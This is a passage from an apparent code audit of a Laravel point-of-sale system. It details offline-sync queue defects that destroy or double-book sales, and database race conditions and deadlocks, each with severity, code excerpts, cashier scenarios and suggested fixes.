- **`CompleteSaleAction`'s transaction boundary is correct.** Stock assertion through `Sale`/`SaleLine`/`SaleTax`/`Payment` creation, gift-card debit, points redemption, promotion redemption, cart close, table release and points award are all inside the single `DB::transaction` at [:117](app/Domain/Sales/Actions/CompleteSaleAction.php#L117). `SaleCompleted::dispatch` fires inside it and its only listener is synchronous and writes one activity-log row, so it commits or rolls back with the sale. **No write occurs after the transaction closes** — the partial-write case the brief asked about is not present here.
- **`PromotionEngine` apportionment** — largest-remainder with the residual forced onto the last line, every share clamped, ratio computed at scale 10 before the Money multiply. No line can be discounted below zero.
- **`InventoryService`** — genuine atomic `quantity = quantity + ?`, ledger row and projection update in one transaction.
- **`VoidSaleAction`, `IssueGiftcardAction`, `TopUpGiftcardAction`, `AdjustPointsAction`, `ReceiveGoodsAction`, `CreatePurchaseOrderAction`, `UpdatePurchaseOrderLinesAction`** — each wraps its ledger row and balance update in one transaction with a `lockForUpdate` re-read inside. `AdjustPointsAction` correctly refuses a negative resulting balance.
- **Negative-amount guards** exist on payments (`gt:0`), tips (`gte:0`) and quantities (`gt:0`); `ValidDecimal` rejects any leading `-`. The gap is exclusively the missing **upper** bound on `discount_value` (1-C2).
- **Tax is computed per line then summed** — correct for a POS, and consistent across `CartPricer`, `CompleteSaleAction` and `RefundSaleAction`. **Discount is applied strictly before tax** everywhere, including `PurchaseLinePricer`. Inclusive and exclusive modes are both implemented; the defect is solely which flag each half reads (1-C1).

---

# Area 2 — Offline register and sync trust boundary

**Headline answer to the brief's critical question: the server does NOT trust client-supplied
totals.** No `total`, `subtotal`, `tax_total` or `line_total` field exists in any FormRequest under
`app/Http/Requests/Api/V1/`; the `complete` op sends an empty body
([engine.js:92](resources/js/pos/sync/engine.js#L92) `body: {},`) and the server prices from its own
catalog and rate matrix ([CompleteSaleAction.php:68](app/Domain/Sales/Actions/CompleteSaleAction.php#L68)).
`add_line` sends only `{item_id, quantity}` and the server reads `$item->unit_price`. **That is the
single most important thing this audit could have found wrong, and it is right.**

The findings below are therefore about *durability and correctness of the queue*, not about
client-authoritative pricing — and several of them destroy real money.

## Confirmed

### 2-C1 · CRITICAL · `remove_line` skips the DELETE but reports success

| Field | Content |
|---|---|
| **Severity** | Critical |
| **Location** | [engine.js:43-49](resources/js/pos/sync/engine.js#L43-L49), triggered from [cart.js:443-447](resources/js/pos/stores/cart.js#L443-L447) |

**What's wrong.** If the line lookup misses, no DELETE is sent — yet the arm still returns
`{ removeLine }`, which `applyResult` uses to strip the line locally:

```js
// engine.js:43-49
case 'remove_line': {
    const line = snapshot.lines.find((candidate) => candidate._tempId === op.localRef);
    if (line?.id) {
        await apiFetch(`/carts/${snapshot.id}/lines/${line.id}`, { method: 'DELETE' });
    }
    return { removeLine: op.localRef };
}
```

The lookup misses **deterministically**, because `cart.js` removes the line from the snapshot
*before* the queued `add_line` has run:

```js
// cart.js:443-447
async removeLine(line) {
    this.cart.lines = this.cart.lines.filter((candidate) => candidate._tempId !== line._tempId);
    await this._touch();                    // snapshot saved -- line is now gone from IndexedDB
    await enqueue('remove_line', this.cart.client_uuid, {}, line._tempId);
```

So by the time the drain reaches `remove_line`, the line it needs to find is already gone from the
snapshot it searches. This is the same defect class as the `update_line` bug recorded at
`PROJECT_STATUS.md:927-940` — an arm that reports success without doing its work.

**Why it matters.** Fully reproducible cashier sequence, offline:

1. Register goes offline. Cashier scans "Ribeye 48.00" → `add_line` queued, line in snapshot with `id: null`.
2. Customer changes their mind; cashier taps ✕ → line removed from snapshot, `remove_line` queued.
3. Cashier takes 20.00 cash for the rest of the order and taps Complete.
4. Wi-Fi returns. `add_line` drains → **the server creates the ribeye line**. `applyResult`'s
   `lineUpdate` can't find the `_tempId`, so the server `id` is never written back.
5. `remove_line` drains → `find` returns undefined → `line?.id` falsy → **DELETE never sent**.
6. `complete` drains → the server prices a cart that still contains the ribeye →
   `paid (20.00) < due (48.00+)` → `CheckoutException::underpaid` → 422 → and per 2-H4 the 422
   **wipes every queued op for the cart**.

**Net result: the customer's paid sale is destroyed and never recorded**, and the cashier sees the
nonsensical message "Payments do not cover the total; 48.00 still due." If the voided line had been
cheap enough that the payment still covered it, the sale completes instead and **the customer is
charged for an item the cashier visibly removed in front of them.**

**Suggested fix.** Make `remove_line` a real operation rather than a lookup: carry the server `id`
(once known) in the op payload and have the drain resolve it against the queue's own `add_line`
result. Critically, if the target cannot be resolved, fail the op loudly rather than returning a
success patch.

---

### 2-C2 · CRITICAL · A 401 on an expired token deletes every queued offline sale

| Field | Content |
|---|---|
| **Severity** | Critical |
| **Location** | [client.js:38-41](resources/js/pos/api/client.js#L38-L41) + [engine.js:190-195](resources/js/pos/sync/engine.js#L190-L195) |

**What's wrong.** The 401 branch constructs an `ApiError` **without** the fourth constructor
argument, so `isNetworkError` defaults to `false`:

```js
// client.js:38-41
if (response.status === 401) {
    removeItem('token');
    throw new ApiError('Unauthorized', 401, null);
}
```

which routes it straight into the drain's *fatal* branch, whose last act is to delete the queue:

```js
// engine.js:190-195
if (error instanceof ApiError && !error.isNetworkError) {
    snapshot.lastError = error.message;
    snapshot.pendingOps = 0;
    await saveCartSnapshot(snapshot);
    await removeOpsForCart(snapshot.client_uuid);
    continue;
}
```

There is no token refresh and no re-auth retry: `apiFetch` is the only network path in the PWA,
`client.js` is 59 lines with no interceptor, and the auth store has only `login`/`logout`. Sanctum
tokens expire in **24 hours** by default (`config/sanctum.php:53`).

**Why it matters.** Exact sequence, and it is routine rather than adversarial:

1. Friday 09:00 — cashier logs in; token valid until Saturday 09:00.
2. Saturday 14:00 — network is down. Cashier rings 6 sales offline; ~40 ops sit in IndexedDB and
   each cart shows its "pending" badge, so the cashier believes they are safe.
3. Saturday 14:30 — Wi-Fi returns; the `online` handler fires `cart.sync()`.
4. First op → `POST /api/v1/carts` → **401** (token expired 5½ hours earlier).
5. `client.js:39` wipes the token; `engine.js:194` wipes cart #1's entire op list; `continue` moves
   to cart #2 → 401 → wiped → … **all six carts destroyed in one loop pass, in under a second.**
6. The cashier is bounced to `/login` on their next tap. After re-login the queue is empty.
   **Six sales' worth of cash sits in the drawer with no sale records and no shift attribution.**

**Suggested fix.** Treat 401 as retryable, not fatal — the `isNetworkError` flag already exists to
express exactly this. Pause the drain, force re-auth, then resume the untouched queue. More broadly,
no error path should ever call `removeOpsForCart` on ops representing money already taken; failed
ops belong in a dead-letter store the cashier can see.

---

### 2-H1 · HIGH · `remove_payment` has the identical no-op defect

| Field | Content |
|---|---|
| **Severity** | High |
| **Location** | [engine.js:54-60](resources/js/pos/sync/engine.js#L54-L60), triggered from [cart.js:476-480](resources/js/pos/stores/cart.js#L476-L480) |

**What's wrong.** Same shape as 2-C1:

```js
// engine.js:54-60
case 'remove_payment': {
    const payment = snapshot.payments.find((candidate) => candidate._tempId === op.localRef);
    if (payment?.id) {
        await apiFetch(`/carts/${snapshot.id}/payments/${payment.id}`, { method: 'DELETE' });
    }
    return { removePayment: op.localRef };
}
```

and `cart.js` likewise filters the payment out of the snapshot before `add_payment` has resolved.

**Why it matters.** Offline, the cashier keys "100.00 cash", realises it was a typo, taps ✕, keys
"10.00". On drain: the 100.00 payment is created server-side and **never deleted**, then 10.00 is
added on top → `paid = 110.00` against a 10.00 bill →
[CompleteSaleAction.php:111-115](app/Domain/Sales/Actions/CompleteSaleAction.php#L111-L115) books
**100.00 of `change_given`**, and `CloseShiftAction::expectedCash` expects 100.00 that was never in
the drawer. Compounds directly with 1-H4.

**Suggested fix.** As 2-C1.

---

### 2-H2 · HIGH · The documented retry-safety property does not exist, and the catch is effectively bare

| Field | Content |
|---|---|
| **Severity** | High |
| **Location** | [engine.js:186-198](resources/js/pos/sync/engine.js#L186-L198), [client.js:28-36](resources/js/pos/api/client.js#L28-L36) |

**What's wrong.** `PROJECT_STATUS.md:2298-2310` states the engine "only retries those on a
connection-level failure (request never reached the server), not on an ambiguous 'sent, response
lost' case, accepting a small residual double-apply risk." **The code does not implement that
distinction.** `isNetworkError` is set in exactly one place — the `fetch` rejection handler:

```js
// client.js:28-36
try {
    response = await fetch(BASE + path, { … });
} catch {
    throw new ApiError('Network error', 0, null, true);
}
```

`fetch()` rejects for connection reset mid-response, socket close after the request bytes were
written, and TLS teardown after the server already committed — all of which *are* "sent, response
lost". The browser cannot distinguish them and this code does not try.

Worse, the drain's fallthrough retries on **anything that is not an ApiError**:

```js
// engine.js:188-198
} catch (error) {
    if (error instanceof ApiError && !error.isNetworkError) {
        …
        continue;
    }
    return;              // op STAYS QUEUED, will be re-sent
}
```

and `client.js:47-52` swallows a body-parse failure into `data = null`, so a 200 with a truncated or
HTML body makes `engine.js:20` (`res.data.id`) throw a `TypeError` → not an `ApiError` → `return` →
**the op is retried forever, once per `sync()`, each retry creating a fresh server row.**

**Why it matters.** Cashier on flaky café Wi-Fi taps "Add payment 40.00 cash". The POST reaches
Laravel, the `CartPayment` row commits, the access point drops the connection before the response.
`fetch` rejects → op stays queued → on reconnect it re-POSTs → **second 40.00 payment row**. The
extra 40.00 is booked as `change_given` and `expectedCash` then expects 40.00 more cash in the drawer
than was ever taken. Same class for `add_line` (duplicate line, customer over-charged) and `add_kit`.

**Suggested fix.** Correct the documentation, and close the gap properly by extending
`Idempotency-Key` support to the line/payment endpoints (see 1-M2) so a retry is safe rather than
merely rare.

---

### 2-H3 · HIGH · The retry policy is exactly inverted

| Field | Content |
|---|---|
| **Severity** | High |
| **Location** | [engine.js:89-96](resources/js/pos/sync/engine.js#L89-L96) vs [:190-195](resources/js/pos/sync/engine.js#L190-L195) |

**What's wrong.** Ops **without** idempotency protection (`create_cart`, `add_line`, `add_payment`,
`add_kit`) are retried on network failure. The one op **with** an `Idempotency-Key` — `complete` —
is **not** retried on a 5xx: a `502/503/504` from a proxy is an `ApiError` with
`isNetworkError === false`, so the fatal branch runs `removeOpsForCart` and destroys the sale
locally, even though the server may have committed it and the guard would have replayed the cached
response for free.

**Why it matters.** nginx returns 504 on `POST /carts/91/complete` while PHP is still inside its
transaction, and PHP goes on to commit the Sale. The client sees a non-network `ApiError` → all cart
ops wiped → `completeSale()` returns `false` → the cashier sees an error and **rings the sale again
on a new cart**. The sale is now **banked twice**, with two different Idempotency-Keys, and the guard
cannot help because the key differs. Note 1-M3 means an in-flight duplicate also surfaces as a 500,
which lands in this same destructive branch.

**Suggested fix.** Retry `complete` on 5xx and on network failure — that is precisely what its
idempotency key is for — and stop retrying the unprotected ops until they have keys of their own.

---

### 2-H4 · HIGH · Any 4xx wipes the entire cart's queue, so every conflict ends in silent total sale loss

| Field | Content |
|---|---|
| **Severity** | High |
| **Location** | [engine.js:194](resources/js/pos/sync/engine.js#L194) `await removeOpsForCart(snapshot.client_uuid);` |

**What's wrong.** There is no per-op quarantine and no dead-letter store: one rejected op discards
every queued op for that cart. This is the common terminus for all four conflict scenarios the brief
asked about, each of which was traced:

| Conflict between offline sale and sync | Server behaviour | Evidence |
|---|---|---|
| **Item price changed** | Silently re-prices at drain time, not sale time | [AddCartLineAction.php:68](app/Domain/Sales/Actions/AddCartLineAction.php#L68) reads `$item->unit_price` when the op drains; the offline price is never sent |
| **Stock went to zero** | 422 `insufficientStock` | [CompleteSaleAction.php:307-309](app/Domain/Sales/Actions/CompleteSaleAction.php#L307-L309) |
| **Promotion expired** | 422 `couponInvalid`, evaluated against sync-time `now()` | [CartCouponController.php:25-30](app/Http/Controllers/Api/V1/CartCouponController.php#L25-L30) |
| **Item soft-deleted** | **404**, not 500 — `Rule::exists` matches soft-deleted rows, then `findOrFail` applies the SoftDeletes scope | [AddCartLineRequest.php:23](app/Http/Requests/Api/V1/AddCartLineRequest.php#L23), [CartLineController.php:26](app/Http/Controllers/Api/V1/CartLineController.php#L26) |

**Why it matters.** Price went **up** while offline → the customer paid the old price → `underpaid`
422 → the whole queue is wiped → **a paid sale vanishes with no server-side trace that it was ever
attempted.** Price went **down** → the sale completes at the new price and the excess cash is booked
as `change_given` that was never handed back → shift overage. The only user-visible trace of a
destroyed sale is a single amber banner rendering `snapshot.lastError`.

**Suggested fix.** Never discard ops representing money already taken. Quarantine the failing op and
its cart into a visible "needs attention" queue a supervisor can resolve; capture the offline price
on the line so a price change is detectable rather than silent.

---

### 2-H5 · HIGH · No lock or claim on a queue row — two tabs, or a crash after the response, double-apply every op

| Field | Content |
|---|---|
| **Severity** | High |
| **Location** | [engine.js:162](resources/js/pos/sync/engine.js#L162), [:200-204](resources/js/pos/sync/engine.js#L200-L204), [queue.js:19-22](resources/js/pos/db/queue.js#L19-L22) |

**What's wrong.** The queue row is deleted only *after* a successful response, in a separate
IndexedDB transaction from the request, and there is no claim/lease flag **on the row**. The only
mutual exclusion is a module-scoped variable, `let inFlight = null;`, which is **per-JS-realm — i.e.
per tab**. Grepping `resources/js/pos/` for `navigator.locks`, `BroadcastChannel`, `SharedWorker` and
any localStorage mutex returns zero hits, while IndexedDB is shared across all tabs of the origin.

**Why it matters.** *Two tabs:* the cashier has the register open in two tabs (or the PWA plus a
browser tab). Both fire on `online` → both call `processQueue()` → each reads the same `ops[0]` and
each POSTs it. Two lines, one customer. Neither tab's `dequeue` prevents the other, because both had
already read the row before either deleted it. *Single tab:* cashier taps "Cash 50.00", the POST
returns 201, and the till PC reboots before `saveCartSnapshot`/`dequeue` complete — on next boot the
row is still queued and the payment posts twice.

**Suggested fix.** Claim the row before sending (write an `inFlightAt`/`leaseId` and skip rows
claimed recently), and coordinate across tabs with `navigator.locks.request()` around the drain.

---

### 2-H6 · HIGH · Offline sales are attributed to the shift open at *sync* time, and destroyed if none is open

| Field | Content |
|---|---|
| **Severity** | High |
| **Location** | [CreateOrResumeCartAction.php:69-73](app/Domain/Sales/Actions/CreateOrResumeCartAction.php#L69-L73) |

**What's wrong.** The shift is resolved when the queued `create_cart` op **drains**, not when the
sale was taken:

```php
$shift = $terminal->openShift();

if ($shift === null) {
    throw CheckoutException::shiftClosed();
}
```

Combined with `'sold_at' => now()` at [CompleteSaleAction.php:175](app/Domain/Sales/Actions/CompleteSaleAction.php#L175),
both the shift attribution and the reporting timestamp are sync-time values.

**Why it matters.** This is the real clock problem, and it is the normal path rather than an attack.

*(a) Cross-shift cash misattribution.* The register loses Wi-Fi at 21:50 during the evening shift and
takes three cash sales; it reconnects at 08:10 the next morning after the morning shift opened. Every
queued `create_cart` binds to the **morning** shift and `sold_at` stamps them 08:10. The evening
Z-report is short by the full offline cash, the morning shift shows an unexplained overage, and
`DATE(sold_at)` buckets yesterday's revenue into today.

*(b) Total loss if no shift is open at reconnect.* Same scenario, but the PWA auto-syncs on the
`online` event at boot — before anyone opens the morning shift. `openShift()` returns `null` →
`shiftClosed` → 422 → per 2-H4, `removeOpsForCart` → **every offline sale from the night before is
deleted from IndexedDB, unrecoverably**, behind one amber banner.

**Suggested fix.** Capture the shift (and a client-recorded sale time) on the cart when it is created
offline and honour it at drain, reconciling explicitly if that shift has since closed. Failing an
offline sale because no shift is currently open, and then deleting it, is the worst available outcome.

---

### 2-M1 · MEDIUM · `apiFetch` has no timeout; one hung request wedges the entire sync engine

| Field | Content |
|---|---|
| **Severity** | Medium |
| **Location** | [client.js:29-33](resources/js/pos/api/client.js#L29-L33), [engine.js:165-170](resources/js/pos/sync/engine.js#L165-L170) |

**What's wrong.** `fetch` is called with no `AbortController` and no `signal`, so a captive-portal or
black-holed TCP connection leaves the promise pending forever. Because `processQueue()` returns the
*same* `inFlight` promise to every caller, `cart.sync()` never clears `this.syncing`, and every later
cart mutation awaits forever.

**Why it matters.** The register appears alive but silently stops syncing until the tab is reloaded.
Hotel and airport captive portals reproduce this reliably; the cashier gets no signal that nothing is
being sent.

**Suggested fix.** Add an `AbortController` with a 10–15s timeout, and surface a stalled drain in the
offline banner.

---

### 2-M2 · MEDIUM · `update_line` silently discards the edit when the `_tempId` cannot be matched

| Field | Content |
|---|---|
| **Severity** | Medium |
| **Location** | [engine.js:26-30](resources/js/pos/sync/engine.js#L26-L30) |

**What's wrong.** Returning `{}` means the PATCH is never sent **and the drain treats the op as a
success and dequeues it**:

```js
case 'update_line': {
    const line = snapshot.lines.find((candidate) => candidate._tempId === op.localRef);
    if (!line?.id) {
        return {};
    }
```

This is reachable through `resumeFromOtherTerminal` ([cart.js:206-207](resources/js/pos/stores/cart.js#L206-L207)),
which re-mints every `_tempId`, orphaning any already-queued `update_line`.

**Why it matters.** A price override or quantity correction simply evaporates with no error shown.
This is the *residue* of the bug fixed per `PROJECT_STATUS.md:927-940` — the re-apply half was fixed,
the silent-drop half was not.

**Suggested fix.** Distinguish "line not yet created" (defer/retry the op) from "line genuinely gone"
(drop it and tell the cashier).

## Suspected

### 2-S1 · `add_line`'s server-side merge can alias two local lines onto one server row

[AddCartLineAction.php:37-58](app/Domain/Sales/Actions/AddCartLineAction.php#L37-L58) merges into an
existing line and returns `$existing`, so `res.data.id` may be an id already bound to a different
`_tempId`. The client's merge predicate ([cart.js:287](resources/js/pos/stores/cart.js#L287)) is not
identical to the server's — it ignores `stock_lot_id` and reads `kitchen_prepared`, refreshed only
opportunistically. Two local `_tempId`s could therefore share one server `id`, after which a
`remove_line` on one deletes the shared row and the sibling 404s. **Pattern-matched, not reproduced**
— worth a targeted test.

## Area 2 — verified clean

- **Totals, taxes, discounts and rounding are recomputed server-side.** No client-supplied amount is persisted for the sale or its lines; `add_line`/`add_kit` source prices from the catalog.
- **No client-controlled timestamp reaches the server at all.** Swept `resources/js/pos/` for `Date.now()`, `toISOString`, `new Date` and `*_at` payload fields: the only `Date.now()` values are `queue.js`'s `createdAt` (never read by the engine) and a local `_tempId` string. No FormRequest declares a date field; `sold_at` is server-stamped. **A hostile browser cannot backdate a sale into a closed shift or a previous reporting day, nor forward-date into a promotion window.** (The shift/date problem that *does* exist is 2-H6 — a server-side attribution bug, not clock skew.)
- **`complete` idempotency-key stability** — the key is minted once and persisted on the snapshot before the op is enqueued, and the request hash is deterministic because the body is always `{}`.
- **Closed-shift guard at completion** cannot be bypassed by a null `shift_id`, which is always set server-side at cart creation.
- **Token storage and transport** — the bearer token is read per request from storage and never written into a queue payload or IndexedDB snapshot, so a stale queued op cannot replay an old identity.
- **Ten of the fourteen `runOp` arms are correct**, and `applyResult` preserves `_tempId` across every `Object.assign`.

---

# Area 3 — Concurrency and race conditions

All findings here assume MySQL/InnoDB at the default **REPEATABLE READ** (no `isolation_level` is
configured in `config/database.php`), so `lockForUpdate()` takes real row and gap locks.

## Confirmed

### 3-C1 · CRITICAL · A stock count applies a stale snapshot as a delta

| Field | Content |
|---|---|
| **Severity** | Critical |
| **Location** | [GenerateStockCountLinesAction.php:36-41](app/Domain/Inventory/Actions/GenerateStockCountLinesAction.php#L36-L41), [SubmitStockCountForReviewAction.php:25-27](app/Domain/Inventory/Actions/SubmitStockCountForReviewAction.php#L25-L27), [ApproveStockCountAction.php:30-38](app/Domain/Inventory/Actions/ApproveStockCountAction.php#L30-L38) |

**What's wrong.** A stock count is an **absolute** measurement of what is on the shelf, but it is
applied as a **relative** delta computed against a snapshot taken arbitrarily earlier, with no lock
and no re-read at any of the three points in time.

At t0, the expected quantity is frozen:

```php
// GenerateStockCountLinesAction.php:36-41
$stockCount->lines()->create([
    'item_id' => $level->item_id,
    'expected_quantity' => $level->quantity,
]);
```

At t1, the variance is frozen against that stale expectation:

```php
// SubmitStockCountForReviewAction.php:25-27
$line->update([
    'variance' => bcsub((string) $line->counted_quantity, (string) $line->expected_quantity, 3),
]);
```

At t2, that stale variance is applied as a delta to whatever the live quantity now is:

```php
// ApproveStockCountAction.php:30-38
$this->inventory->record(
    item: $line->item,
    stockLocationId: $stockCount->stock_location_id,
    quantityDelta: (string) $line->variance,
```

**Why it matters.** Manager M generates count lines at t0 for item X: `expected_quantity = 10`.
Cashier C sells 3 units at t1 — `stock_levels.quantity` correctly becomes 7. M physically counts 10
on the shelf (correct: 3 were sold from a shelf that held 13, or the sale is yet to be picked) and
submits at t2 → `variance = 10 − 10 = 0` → `ApproveStockCountAction:26` **skips the line entirely**.
The projection stays at 7 while the shelf holds 10. *The count measured reality and then discarded
it.* Inverse case: M counts 9 → `variance = −1` → approve applies `7 + (−1) = 6` against a physical
9, so **the sale is subtracted twice**.

No DB constraint can catch this, nothing errors, and `stock:reconcile` will report zero drift because
the bogus delta was written to the ledger too. **Silent inventory corruption.**

**Suggested fix.** Re-read the live quantity under `lockForUpdate` at approval time and post
`counted_quantity − live_quantity` as the delta, or store the count as an absolute set-to value with
the intervening ledger movements re-applied. Either way the count must be reconciled against the
quantity at approval, not at generation.

---

### 3-H1 · HIGH · A sale can commit into a shift that is closing

| Field | Content |
|---|---|
| **Severity** | High |
| **Location** | [CompleteSaleAction.php:64-66](app/Domain/Sales/Actions/CompleteSaleAction.php#L64-L66) vs [CloseShiftAction.php:24-31](app/Domain/Sales/Actions/CloseShiftAction.php#L24-L31) |

**What's wrong.** The shift check in `CompleteSaleAction` runs **before** the transaction opens and
is a plain, unlocked read:

```php
if ($cart->shift !== null && ! $cart->shift->isOpen()) {
    throw CheckoutException::shiftClosed();
}
```

Inside the transaction the shift is only copied as a foreign key. There is **no `lockForUpdate` and
no shared lock on `shifts` anywhere in `CompleteSaleAction`**. Meanwhile `CloseShiftAction` locks the
shift row and computes `expectedCash()` with a plain consistent read of `payments`. The two lock
domains never intersect, so neither transaction ever blocks the other.

**Why it matters.** Cashier A takes 50.00 cash and hits complete; `isOpen()` passes at t1 and the
transaction opens at t2. Manager B closes the shift at t3: locks the shift row, `expectedCash()` at t4
does **not** see A's uncommitted sale, and `status → closed` commits at t5. A's transaction commits at
t6 — producing a `sales` row whose `shift_id` points at a **closed** shift, and a captured cash
payment that was never in `expected_cash`. The drawer physically holds 50.00 more than
`expected_cash`, recorded as a **+50.00 `cash_variance`** blamed on the cashier, and because nothing
recomputes `expected_cash` after close, **that money is invisible to the till report forever**.

The same hole exists on cart resume: [CreateOrResumeCartAction.php:50-54](app/Domain/Sales/Actions/CreateOrResumeCartAction.php#L50-L54)
reads `$terminal->openShift()` unlocked and stamps `shift_id` onto the cart.

**Suggested fix.** Take a shared lock on the shift row inside `CompleteSaleAction`'s transaction and
re-check `isOpen()` under it, so a concurrent close either blocks or correctly rejects the sale.

---

### 3-H2 · HIGH · No unique index backs "one open shift per terminal"

| Field | Content |
|---|---|
| **Severity** | High |
| **Location** | [create_register_tables.php:31-48](database/migrations/2026_01_01_000600_create_register_tables.php#L31-L48), [OpenShiftAction.php:26-34](app/Domain/Sales/Actions/OpenShiftAction.php#L26-L34) |

**What's wrong.** The `shifts` table has `$table->string('status', 16)->default('open')->index();`
and a plain `terminal_id` FK — **no composite unique anywhere**. Grepping every migration for a
unique index on `shifts` returns nothing. The invariant rests entirely on an application-level
check-then-act:

```php
// OpenShiftAction.php:26-34
return DB::transaction(function () use ($terminal, $user, $openingFloat, $note) {
    $existing = Shift::where('terminal_id', $terminal->id)
        ->where('status', Shift::STATUS_OPEN)
        ->lockForUpdate()
        ->first();

    if ($existing !== null) {
        throw ShiftException::alreadyOpen();
    }
```

This is a `SELECT … FOR UPDATE` **that matches no rows**, so the only thing it can hold is a gap lock.

**Why it matters.** Under REPEATABLE READ, two concurrent opens (cashier A at the terminal, manager B
opening it remotely) both take *compatible* gap locks, then both attempt the insert — the
insert-intention locks conflict and one side dies with **deadlock 1213 → an unhandled 500**, rather
than the intended `ShiftException::alreadyOpen()` 422. More importantly, because gap locking is the
*entire* protection, anything that removes it — running at READ COMMITTED, or MySQL choosing a
different plan — produces **two open shift rows with no error at all**. Once that happens,
`Terminal::openShift()` silently picks one (`->latest('opened_at')->first()`), so the other shift
accumulates no sales and **can never be found to be closed**, leaving its cash permanently
unreconciled. `ShiftPolicy.php:17` performs a second, unlocked check-then-act on the same invariant
from a different process.

**Suggested fix.** Add the missing constraint — a unique index on `(terminal_id, status)` (or a
generated `open_marker` column that is `terminal_id` when open and `NULL` when closed), so the
database enforces the invariant and the race degrades to a clean constraint violation.

---

### 3-H3 · HIGH · Lock-order inversions produce deadlock 500s at the register under load

| Field | Content |
|---|---|
| **Severity** | High |
| **Location** | [CompleteSaleAction.php:296-305](app/Domain/Sales/Actions/CompleteSaleAction.php#L296-L305), [Cart.php:49](app/Domain/Sales/Models/Cart.php#L49), [TransferStockAction.php:39-57](app/Domain/Inventory/Actions/TransferStockAction.php#L39-L57), [DocumentNumberGenerator.php:31-58](app/Domain/Documents/DocumentNumberGenerator.php#L31-L58) |

**What's wrong.** Three separate lock-ordering hazards, all of which acquire multiple row locks in a
caller-determined rather than canonical order.

*(a) Stock rows are locked in cart-line order.* `CompleteSaleAction` iterates `$cart->lines`, which
`Cart.php:49` orders by `line_number` — entry order, not a canonical key order. Terminal A rings item
7 then item 3; terminal B rings item 3 then item 7 at the same instant; A locks `stock_levels(7)`, B
locks `stock_levels(3)`, each then waits on the other → **deadlock 1213 → 500 mid-checkout**.

*(b) Transfers lock source-then-destination.* `TransferStockAction` records the out-leg then the
in-leg (correctly in one transaction), so clerk A transferring Warehouse→Shop and clerk B
transferring Shop→Warehouse for the same item deadlock. `TransferStockAction` also never verifies the
source has the quantity, so a transfer can drive `stock_levels.quantity` negative.

*(c) `document_sequences` is locked before stock in some paths and after it in others.* Because
`DocumentNumberGenerator::next()`'s `DB::transaction` is **nested inside** the caller's transaction it
degrades to a SAVEPOINT, so its `lockForUpdate` on the sequence row is held until the **outer**
commit. `CompleteSaleAction` locks `stock_levels` then the sequence; `RefundSaleAction` and
`ReceiveGoodsAction` lock the sequence then `stock_levels`. Every concurrent (sale, refund) or
(sale, goods-receipt) pair on a shared item is a deadlock candidate.

**Why it matters.** Deadlocks roll back cleanly, so **money and stock stay consistent** — this is an
availability and UX finding, not corruption. But `bootstrap/app.php:41-53` renders no handler for
`QueryException`, so the losing side gets a raw **500** at the register rather than "please retry".
Point (c) additionally **serialises every checkout in the store behind one `document_sequences` row**
for the entire duration of each sale transaction (payments, loyalty, gift cards, event dispatch),
which is a throughput ceiling as well as a hazard.

**Suggested fix.** Lock stock rows in a canonical order (`ORDER BY item_id, stock_location_id`) in
both `CompleteSaleAction` and `TransferStockAction`; acquire the document number in a consistent
position relative to stock across all three actions, and ideally as late as possible. Add a retry-on-
deadlock wrapper and render `QueryException` as a 409/503 rather than a 500.

---

### 3-M1 · MEDIUM · Several check-then-act paths are saved only by a unique index, and surface as a 500

| Field | Content |
|---|---|
| **Severity** | Medium |
| **Location** | [ApproveStockCountAction.php:20-24](app/Domain/Inventory/Actions/ApproveStockCountAction.php#L20-L24), [Cart.php:94-97](app/Domain/Sales/Models/Cart.php#L94-L97), [bootstrap/app.php:41-53](bootstrap/app.php#L41-L53) |

**What's wrong.** Three related instances:

- **Stock count double-approval.** `ApproveStockCountAction` checks `status !== STATUS_REVIEW`
  *outside* its transaction and never locks the `stock_counts` row. A manager double-clicking
  "Approve" ([StockCounts/Form.php:155](app/Livewire/Inventory/StockCounts/Form.php#L155)) can have
  both requests read `review`, both loop the lines, and **post every variance twice** to the ledger
  and the projection. There is no constraint to catch it — a later `Unapprove` reverses it only once,
  leaving permanent drift. (Same shape in `UnapproveStockCountAction` and
  `SubmitStockCountForReviewAction`.)
- **Cart line numbering.** `Cart::nextLineNumber()` is `MAX(line_number) + 1`, and the `lockForUpdate`
  in `AddCartLineAction` locks only rows matching *that item*, so a concurrent add of a **different**
  item blocks nothing. Two waiters adding to a shared table cart both compute the same number; the
  `unique(['cart_id','line_number'])` index rejects the second → the waiter's item silently fails to
  be added, with a 500.
- **No handler for constraint violations.** `bootstrap/app.php` renders only the domain exceptions
  (`CheckoutException`, `ShiftException`, `IdempotencyConflictException`, and so on). Every unique-
  constraint save and every InnoDB deadlock therefore reaches the client as a **500**.

**Why it matters.** The stock-count case is genuine silent corruption. The other two are data-safe
but produce 500s that the offline PWA's error handling interprets as fatal — per 2-H3/2-H4, a 500 on
`complete` causes it to **destroy the queued sale**. The missing exception handler is what converts a
survivable race into data loss one layer up.

**Suggested fix.** Lock the `stock_counts` row inside the transaction and re-check its status. Let the
DB assign `line_number` (or catch and retry on violation). Register renderers for
`UniqueConstraintViolationException` (409) and deadlock `QueryException` (retry, then 503).

---

### 3-M2 · MEDIUM · An open shift survives its terminal being soft-deleted, and becomes unreachable

| Field | Content |
|---|---|
| **Severity** | Medium |
| **Location** | [Terminals/Index.php:25-33](app/Livewire/Sales/Terminals/Index.php#L25-L33), [TerminalPolicy.php:32-35](app/Policies/TerminalPolicy.php#L32-L35) |

**What's wrong.** Terminal deletion checks only the permission — there is no guard against an open
shift — and `Terminal` uses `SoftDeletes`, so the `cascadeOnDelete` on `shifts.terminal_id` **never
fires** (no row is actually deleted).

**Why it matters.** A manager deletes a terminal that still has an open shift. The shift row survives
with a soft-deleted parent, and because the shift picker filters on live, active terminals
([Manage.php:148-152](app/Livewire/Sales/Shift/Manage.php#L148-L152)) **the shift can no longer be
reached to be closed** — its cash is permanently unreconciled. `opened_by_user_id` is constrained with
no `nullOnDelete` and `User` also soft-deletes, leaving the same dangling reference for a deleted
operator.

**Suggested fix.** Refuse to delete a terminal with an open shift in `TerminalPolicy::delete` or the
component, and add an admin path to close an orphaned shift.

## Suspected

- **Numbering settings can rewind a live sequence.** [Numbering.php:68-74](app/Livewire/Settings/Numbering.php#L68-L74) writes `next_value` via `updateOrCreate` with no lock and only `['required','integer','min:1']` validation. An admin saving a stale form concurrently with in-flight `next()` calls rewinds the counter into already-issued numbers; the next sale then violates `sales.number`'s unique index → repeated **500s at the register** until an admin fixes the counter.
